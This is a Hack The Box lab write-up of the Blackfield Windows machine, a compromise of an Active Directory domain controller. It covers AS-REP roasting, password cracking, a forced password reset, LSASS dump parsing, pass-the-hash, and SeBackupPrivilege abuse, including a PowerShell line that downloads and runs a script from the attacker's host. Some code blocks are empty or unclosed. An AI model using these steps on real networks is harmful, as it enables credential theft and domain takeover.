{% include toc icon="cog" title="Blackfield Solution" %}

The [Blackfield](https://app.hackthebox.com/machines/Blackfield) machine has been created by [aas](https://app.hackthebox.com/users/6259). This is an **hard** Windows Machine with a strong focus on Active Directory exploitation. Lots of reconnaissance was involved to get administrative privileges on this machine but the token abuse part was interesting.

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_dark.png?raw=true) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

**Note:** All the actions performed against the target machine have been done with a standard *Kali Linux* machine. You can download Kali from the official website [here](https://www.kali.org/).

# Reconnaissance

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Scan with Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.

```bash
$ nmap -sV -Pn 10.129.140.139
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 09:11 EST

```

This computer seems to be a domain controller for **blackfield.local**. Let's see if we can extract some users.

## LDAP

First, let's see if we can do an anonymous bind on the LDAP port using [ldapsearch](https://linux.die.net/man/1/ldapsearch).

```bash
$ ldapsearch -x -b "dc=blackfield,dc=local" -H ldap://10.129.140.139
# extended LDIF
#
# LDAPv3
# base <dc=blackfield,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

This is a no...

## Shared Folders

Maybe we can try to find some open shares via an anonymous login on the target machine with [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). Note that the **-N** switch suppresses the normal password prompt.

```bash
$ smbclient -N -L \\\\10.129.140.139

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

We do have a few shares, let's start with the **profiles$** folder. Note that we tried the **forensic** folder, but we don't have enough privileges to read it.

```bash
$ smbclient -N \\\\10.129.140.139\\profiles$
Try "help" to get a list of possible commands.

Folder with usernames ! While we could explore the folders one by one, let's dump all the usernames first and see if there is a faster way to get access. 

Given we are a bit lazy, we did a quick and dirty regex to dump the usernames to a file.

```bash
$ smbclient -N \\\\10.129.140.139\\profiles$ -c dir | sed \$d | grep -oE '([a-zA-Z0-9]{5,})' > users.txt
```

Now, we should have all our usernames in the **users.txt** file.

# Initial Access

With the previously generated user list, we could try to do some brute force or password spraying attacks. However, it could be time consuming and we don’t have any information about the domain’s password policy and lockout threshold. Let’s stay on the safe side for now and try an [ASREPRoast](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat) attack.

## ASREPRoast

As a reminder, AS-REP roasting is a technique that allows retrieving password hashes for users that have the **Do not require Kerberos preauthentication** property selected. It means that we can recover a hash which can be cracked offline.

One of the best tools for the job would be [impacket-GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py), which should already be installed on Kali.

```bash
$ impacket-GetNPUsers blackfield.local/ -usersfile users.txt -dc-ip 10.129.140.139

Nice, we do have a hash for the **support** user. If the user is using a weak password, we may be able to recover it.

## Password Cracking

Now, we just have to copy/paste the recovered hash in a file and try to crack it offline using the *rockyou* password list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.

```bash
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])

Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Great, we now have credentials the **support** account (`support:#00^BlackKnight`). 

## WinRM Access

Using another awesome tool, [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), we can check if the user's password is properly working.

```bash
$ crackmapexec smb 10.129.140.139 -d blackfield.local -u support -p '#00^BlackKnight'
SMB         10.129.140.139  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.129.140.139  445    DC01             [+] blackfield.local\support:#00^BlackKnight 
```

The credentials are valid, but we still don't have any remote shell on the machine. Let's see if we can get some information about the domain using **BloodHound**.

## Active Directory Recon

With a valid account, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. Here, we use a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).

```bash
$ bloodhound-python -c All -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.140.139 --zip

```

Luckily, the user **support** has the [ForceChangePassword](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) permission over the **audit2020** user. It means that we can change **audit2020** password without knowing its current password.

![image-center](/images/htb/htb_blackfield_bloodhound_support.png){: .align-center}

Changing **audit2020** password using our Kali machine is [easy](https://malicious.link/post/2017/reset-ad-user-password-with-linux/) and can be done with [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html).

```bash
$ rpcclient -U blackfield.local/support 10.129.140.139
Enter BLACKFIELD.LOCAL\support's password: 
rpcclient $> setuserinfo audit2020 23 Qwerty1!
rpcclient $> 
```

Once the credentials are updated, we can check if the change worked.

```bash
$ crackmapexec smb 10.129.140.139 -d blackfield.local -u audit2020 -p 'Qwerty1!'
SMB         10.129.140.139  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)
SMB         10.129.140.139  445    DC01             [+] blackfield.local\audit2020:Qwerty1! 
```

Yay, another valid account :)

## More Shares

Back to the shares we found in the first part, using **crackmapexec** and the `--shares` switch , we can see that **audit2020** can read the **forensic** folder.

```bash
$ crackmapexec smb 10.129.140.139 -d blackfield.local -u audit2020 -p 'Qwerty1!' --shares
SMB         10.129.140.139  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:blackfield.local) (signing:True) (SMBv1:False)

```

Let's start by recursively download the content of the **forensic** folder and see if we can find something. Note that we used `recurse` to enable directory recursion for the command `mget` and `prompt off` to make sure that all specified files (if any) will be transferred without asking if we want to download them.

```bash
$ smbclient \\\\10.129.140.139\\forensic -U audit2020
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.

## LSASS Dump

Lots of files, but one seems to be very interesting: **lsass.zip**. Let's extract that one.

```bash
$ unzip lsass.zip          
Archive:  lsass.zip
  inflating: lsass.DMP               
```

Using [pypykatz](https://github.com/skelsec/pypykatz), a **mimikatz** implementation in Python, we can try to read the content of **lsass.DMP** and maybe grab some passwords or hashes.

```bash
$ pypykatz lsa minidump lsass.DMP

                DPAPI: a03cd8e9d30171f3cfe8caad92fef621

...[snip]...
```

We have an NTLM hash for **svc_backup**. Using the recovered hash and `crackmapexec` we could perform a *Pass-the-Hash** attack and try to authenticate as **svc_backup**.

Note that **Pass the hash** (or *PtH*) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

```bash
$ crackmapexec winrm 10.129.140.139 -d blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d                                 
HTTP        10.129.140.139  5985   10.129.140.139   [*] http://10.129.140.139:5985/wsman
WINRM       10.129.140.139  5985   10.129.140.139   [+] blackfield.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

The hash is valid and we do have a WinRM access to the remote computer.

## WinRM Access

Using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and the recovered account, we can try to connect to the remote machine.

```bash
$ evil-winrm -i 10.129.140.139 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> dir ..\Desktop


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt

```

We now have a remote shell access and the **first flag**.

# Privilege Escalation

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## Thanks Mike

After looking around for potential privilege escalation paths, we found an interesting privilege for our user.

```bash
*Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION

*Evil-WinRM* PS C:\> 
```

We do have the **SeBackupPrivilege** privilege. In fact, according to Bloodhound, we can see that we are a member of the **Backup Operators** group.

Let's see what we can do with this privilege.

## Abusing Tokens

The [SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) privilege is really interesting. It was designed for allowing users to create backup copies of the system. Since it is not possible to make a backup of something that you cannot read. This privilege comes at the cost of providing the user with full read access to the file system.

In a nutshell, it causes the system to grant all read access control to any file (read only). So, we could read the **root.txt** by abusing this token. 

Using a tool called [Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1), we were able to change the access rights of the **svc_backup** and allow him to read the **administrator** folder.

```bash
*Evil-WinRM* PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.97/Acl-FullControl.ps1')
*Evil-WinRM* PS C:\> Acl-FullControl -user blackfield\svc_backup -path c:\users\administrator
[+] Current permissions:

Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BLACKFIELD\Administrator Allow  FullControl
Audit  :
Sddl   : O:SYG:SYD:P(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)

[+] Changing permissions to c:\users\administrator
[+] Acls changed successfully.

Path   : Microsoft.PowerShell.Core\FileSystem::C:\users\administrator
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BLACKFIELD\Administrator Allow  FullControl
         BLACKFIELD\svc_backup Allow  FullControl
Audit  :
Sddl   : O:SYG:SYD:PAI(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;LA)(A;OICI;FA;;;S-1-5-21-4194615774-2175524697-3563712290-1413)
```

Now, we should have the necessary rights to read the **root.txt** file and get the **second flag**.

```bash
*Evil-WinRM* PS C:\> dir c:\Users\Administrator\Desktop\root.txt


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/5/2020   8:38 PM             32 root.txt
```

Awesome ! I hope you enjoyed it, I know I did :)
